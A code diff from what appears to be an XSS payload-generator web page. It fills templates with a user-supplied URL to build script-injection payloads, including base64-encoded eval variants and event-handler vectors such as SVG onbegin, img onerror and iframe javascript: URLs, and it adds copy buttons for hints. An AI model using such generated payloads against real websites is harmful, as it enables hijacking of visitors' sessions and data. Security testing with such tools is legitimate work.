+                    '[2] Constructor without eval',
+                    '[3] eval(atob()) method',
+                    '[4] Template literal without special chars',
+                    '[5] One-step XSS URL',
+                    '[6] Two-step: Injection code',
+                    '[7] Two-step: Execution URL (direct)',
+                    '[8] Two-step: Execution URL (encoded)'
+                ]);
+            }
 
-        document.getElementById("payload3").value = data3.replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+            // Process payload2
+            if (data2) {
+                const processed2 = data2.replace(/arr0w1_on_event_js/g, js_code_append_a_script_tag_with_url_path)
+                    .replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+                displayPayloadOther('payload2', processed2, [
+                    '[1] SVG set onbegin',
+                    '[2] SVG set onbegin (base64)',
+                    '[3] SVG set onbegin (constructor)',
+                    '[4] SVG animate onrepeat',
+                    '[5] SVG animate onrepeat (base64)'
+                ]);
+            }
 
-        document.getElementById("payload4").value = data4.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+            // Process payload3
+            if (data3) {
+                const processed3 = data3.replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+                displayPayloadOther('payload3', processed3, [
+                    '[1] img onerror with id',
+                    '[2] img onerror (base64)'
+                ]);
+            }
 
-        document.getElementById("payload5").value = data5.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+            // Process payload4
+            if (data4) {
+                const processed4 = data4.replace(/arr0w1_on_event_js/g, js_code_append_a_script_tag_with_url_path)
+                    .replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+                displayPayloadOther('payload4', processed4, [
+                    '[1] details ontoggle',
+                    '[2] details ontoggle (base64)'
+                ]);
+            }
 
-        document.getElementById("payload6").value = data6.replace(/arr0w1_on_event_js/g,js_code_append_a_script_tag_with_url_path).replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+            // Process payload5
+            if (data5) {
+                const processed5 = data5.replace(/arr0w1_on_event_js/g, js_code_append_a_script_tag_with_url_path)
+                    .replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+                displayPayloadOther('payload5', processed5, [
+                    '[1] CSS animation onanimationend',
+                    '[2] CSS animation onanimationend (base64)',
+                    '[3] CSS animation onwebkitanimationend',
+                    '[4] CSS animation onwebkitanimationend (base64)'
+                ]);
+            }
 
-        auto_grow(document.getElementById("payload0"));
-        auto_grow(document.getElementById("payload1"));
-        auto_grow(document.getElementById("payload2"));
-        auto_grow(document.getElementById("payload3"));
-        auto_grow(document.getElementById("payload4"));
-        auto_grow(document.getElementById("payload5"));
-        auto_grow(document.getElementById("payload6"));
+            // Process payload6
+            if (data6) {
+                const processed6 = data6.replace(/arr0w1_on_event_js/g, js_code_append_a_script_tag_with_url_path)
+                    .replace(/arr0w1_base64/g, js_code_append_a_script_tag_btoa_ed);
+                displayPayloadOther('payload6', processed6, [
+                    '[1] iframe javascript: protocol',
+                    '[2] iframe javascript: protocol (base64)'
+                ]);
+            }
+        } catch (e) {
+            console.error('Error in func_oninput:', e);
+        }
     }
 
     // -----
 
+    // Display hints for each payload
+    function displayHints() {
+        for (let i = 1; i <= 6; i++) {
+            const hintsElement = document.getElementById(`hints${i}`);
+            const displayElement = document.getElementById(`hints${i}-display`);
+            if (hintsElement && displayElement) {
+                // Clone and process hints
+                const hintsClone = hintsElement.cloneNode(true);
+                hintsClone.removeAttribute('hidden');
+                hintsClone.removeAttribute('id');
+                
+                // Replace placeholders in hints
+                const your_url_path = document.getElementById("your_url_path").value;
+                const js_code = document.getElementById("data0").value.replace("arr0w1_url", your_url_path);
+                const js_code_btoa = func_wise_btoa(js_code);
+                
+                // Replace placeholders in hint text
+                let hintsHtml = hintsClone.innerHTML;
+                // Replace both old and new placeholder formats
+                hintsHtml = hintsHtml.replace(/arr0w1_url/g, your_url_path);
+                hintsHtml = hintsHtml.replace(/ARR0W1_ON_EVENT_JS_PLACEHOLDER/g, js_code);
+                hintsHtml = hintsHtml.replace(/arr0w1_on_event_js/g, js_code);
+                hintsHtml = hintsHtml.replace(/ARR0W1_BASE64_PLACEHOLDER/g, js_code_btoa);
+                hintsHtml = hintsHtml.replace(/arr0w1_base64/g, js_code_btoa);
+                
+                displayElement.innerHTML = hintsHtml;
+                
+                // Add copy buttons to each hint-code element
+                // Use a more robust approach: process all hint-code elements
+                const hintCodes = displayElement.querySelectorAll('.hint-code');
+                hintCodes.forEach((hintCode) => {
+                    // Check if already has copy button
+                    const existingWrapper = hintCode.closest('.code-with-copy');
+                    if (existingWrapper) {
+                        // If wrapper exists, check if it has copy button
+                        if (!existingWrapper.querySelector('.copy-btn')) {
+                            // Wrapper exists but no copy button, add it
+                            const copyBtn = document.createElement('button');
+                            copyBtn.className = 'copy-btn';
+                            copyBtn.textContent = 'Copy';
+                            const codeText = hintCode.textContent || hintCode.innerText;
+                            copyBtn.onclick = function() {
+                                navigator.clipboard.writeText(codeText).then(() => {
+                                    const originalText = copyBtn.textContent;
+                                    copyBtn.textContent = 'Copied!';
+                                    setTimeout(() => {
+                                        copyBtn.textContent = originalText;
+                                    }, 1500);
+                                });
+                            };
+                            existingWrapper.appendChild(copyBtn);
+                        }
+                        return; // Already wrapped, skip
+                    }
+                    
+                    // No wrapper exists, create one
+                    const parent = hintCode.parentElement;
+                    
+                    // Create wrapper
+                    const wrapper = document.createElement('div');
+                    wrapper.className = 'code-with-copy';
+                    
+                    // Get the code text before moving
+                    const codeText = hintCode.textContent || hintCode.innerText;
+                    
+                    // Insert wrapper before hint-code in parent
+                    parent.insertBefore(wrapper, hintCode);
+                    // Move hint-code into wrapper
+                    wrapper.appendChild(hintCode);
+                    
+                    // Add copy button
+                    const copyBtn = document.createElement('button');
+                    copyBtn.className = 'copy-btn';
+                    copyBtn.textContent = 'Copy';
+                    copyBtn.onclick = function() {
+                        navigator.clipboard.writeText(codeText).then(() => {
+                            const originalText = copyBtn.textContent;
+                            copyBtn.textContent = 'Copied!';
+                            setTimeout(() => {
+                                copyBtn.textContent = originalText;
+                            }, 1500);
+                        });
+                    };
+                    wrapper.appendChild(copyBtn);
+                });
+                
+                // Double check: ensure all hint-code elements have copy buttons
+                // This is a safety net to catch any missed elements
+                setTimeout(() => {
+                    const allHintCodes = displayElement.querySelectorAll('.hint-code');
+                    allHintCodes.forEach((hintCode) => {
+                        let wrapper = hintCode.closest('.code-with-copy');
+                        
+                        // If no wrapper, create one
+                        if (!wrapper) {
+                            const parent = hintCode.parentElement;
+                            wrapper = document.createElement('div');
+                            wrapper.className = 'code-with-copy';
+                            parent.insertBefore(wrapper, hintCode);
+                            wrapper.appendChild(hintCode);
+                        }
+                        
+                        // Ensure copy button exists
+                        if (!wrapper.querySelector('.copy-btn')) {
+                            const copyBtn = document.createElement('button');
+                            copyBtn.className = 'copy-btn';
+                            copyBtn.textContent = 'Copy';
+                            const codeText = hintCode.textContent || hintCode.innerText;
+                            copyBtn.onclick = function() {
+                                navigator.clipboard.writeText(codeText).then(() => {
+                                    const originalText = copyBtn.textContent;
+                                    copyBtn.textContent = 'Copied!';
+                                    setTimeout(() => {
+                                        copyBtn.textContent = originalText;
+                                    }, 1500);
+                                });
+                            };
+                            wrapper.appendChild(copyBtn);
+                        }
+                    });
+                }, 100);
+            }
+        }
+    }
+
+        // Update func_oninput to also update hints
+        var original_func_oninput = func_oninput;
+        func_oninput = function() {
+            original_func_oninput();
+            displayHints();
+        }
+
+        // Make func_oninput available globally for oninput handler
+        window.func_oninput = func_oninput;
+
+        // Attach input event listener
+        const urlInput = document.getElementById("your_url_path");
+        if (urlInput) {
+            urlInput.addEventListener('input', func_oninput);
+        }
+
     func_oninput();
+    }); // End of DOMContentLoaded
 </script>
 
 </html>
